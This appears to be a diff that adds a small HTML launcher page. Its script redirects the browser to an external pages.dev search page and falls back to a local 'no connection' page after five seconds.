@@ -1,0 +1,14 @@
+<html>
+<body>
+    <script>
+        var target = "https://xfatching.pages.dev/f/Search.aspx";
+        // Attempt to load the real site
+        window.location.href = target;
+        
+        // If the page doesn't load after 5 seconds, it's probably offline
+        setTimeout(function() {
+            window.location.href = "NoConnection.html?url=" + encodeURIComponent(target);
+        }, 5000);
+    </script>
+</body>
+</html>
